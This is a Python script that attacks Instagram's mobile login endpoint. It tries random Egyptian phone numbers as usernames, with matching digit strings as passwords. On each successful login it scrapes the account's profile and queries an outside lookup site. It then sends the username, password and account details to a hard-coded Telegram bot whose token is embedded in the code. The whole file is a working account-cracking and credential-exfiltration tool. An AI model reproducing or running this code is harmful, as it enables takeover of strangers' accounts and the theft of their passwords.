import os, pyfiglet
os.system('clear')
try:
    import time
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('pip install colorama')
    os.system('pip install pyfiglet')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
    aa = 0
    zz = 0
    nn = 0
    aa = 0
    zz = 0
    nn = 0
    E = '\x1b[1;31m'
    G = '\x1b[1;32m'
    S = '\x1b[1;33m'
    Z = '\x1b[1;31m'
    X = '\x1b[1;33m'
    Z1 = '\x1b[2;31m'
    F = '\x1b[2;32m'
    A = '\x1b[2;39m'
    C = '\x1b[2;35m'
    B = '\x1b[2;36m'
    Y = '\x1b[1;34m'
    print(X+ "mina")
    ID = 1354777997
print('\n')
sleep(0.2)
tok = '1894082224:AAGVO-Ue75yRVKUaBPnPOXOxPwUQ-iL_Ff0'
import time
t = time.localtime()
current_time = time.strftime("%H:%M:%S", t)
start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=LODING..... ⏸️").json()
id_msg = start_msg['result']['message_id']
def code_joo(userQ, password):
        cookie = secrets.token_hex(8) * 2
        head = {'HOST':'www.instagram.com',  'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
        req_id = requests.get(url_id, headers=head).json()
        name = str(req_id['graphql']['user']['full_name'])
        id    = str(req_id['graphql']['user']['id'])
        followes    = str(req_id['graphql']['user']['edge_followed_by']['count'])
        following    = str(req_id['graphql']['user']['edge_follow']['count'])
        isp    = str(req_id['graphql']['user']['is_private'])
        idd    = str(req_id['graphql']['user']['id'])
        bio    = str(req_id['graphql']['user']['biography'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
        ree = re.json()
        dat = ree['data']
        t = time.localtime()
        current_time = time.strftime('%H:%M:%S', t)
        joo3 = f"""𝐇𝐈 𝐌𝐀𝐓𝐋𝐎𝐁 𝐍𝐄𝐖 𝐇𝐈𝐓🙈
𝐍𝐀𝐌𝐄 🙈 : {name} 
𝐔𝐒𝐄𝐑 🙈 : {userQ}
𝐏𝐀𝐒𝐒 🙈 : {password}
𝐈𝐃 🙈 : {idd}
𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 ♥ : {followes} 
𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆 🖤 : {following}
𝐃𝐀𝐓𝐀 🙈 : {dat}
𝐏𝐑𝐀𝐈𝐕𝐓𝐄 🙈 : {isp}
𝐁𝐈𝐎 : {bio}
𝐓𝐈𝐌𝐄 : {current_time}
𝐁𝐀𝐃 : {aa}
𝐍𝐔𝐌𝐁𝐄𝐑 : [{zz}]
𝐅𝐑𝐎𝐌 @PR2_NET :  @F_7_U"""
        tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {joo3} \n"
        i = requests.post(tlg)
        print(G + joo3)
url = 'https://b.i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
while True:
    	user = '0987654321'
    	NUMB= ['0122','0112','0109','0101','0117','0121','0151','0155','0108','0106','0118','0122']
    	us = str(''.join((random.choice(user) for i in range(7))))
    	op= random.choice(NUMB)
    	username = '+2' + op + us
    	password = op + us
    	from uuid import uuid4
    	uid = str(uuid4())
    	data = {'uuid':uid,  'password':password, 
    	'username':username, 
    	'device_id':uid, 
    	'from_reg':'false', 
    	'_csrftoken':'missing', 
    	'login_attempt_countn':'0'}
    	req = requests.post(url, headers=headers, data=data, allow_redirects=True)
    	if 'logged_in_user' in req.json():
    	   zz += 1
    	   userQ = req.json()['logged_in_user']['username']
    	   code_joo(userQ, password)
    	elif '"message":"challenge_required","challenge"' in req.json():
    		nn += 1
    	else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=𝐒 𝐓 𝐀 𝐑 𝐓 𝐂 𝐇 𝐄 𝐄 𝐊  𝐈 𝐍 𝐒 𝐓 𝐀  𝐁 𝐘\n𝐌 𝐀 𝐓 𝐋 𝐎 𝐁 : @F_7_U✅\n𝐇 𝐈 𝐓 : {zz}\n𝐁 𝐀 𝐃 : {aa} \n𝐂 𝐇 𝐄 𝐄 𝐊 : {username} \n𝐏 𝐀 𝐒 𝐒 : [{password}] \n𝐓 𝐈 𝐌 𝐄 : {current_time}\n𝐁 𝐘 : @F_7_U")
            os.system('cls' if os.name == 'nt' else 'clear')
            print(E + f'''
	
     ᴴᴵᵀ •   [{zz}]  
    ᴮᴬᴰ •   [{aa}]
''')
            aa += 1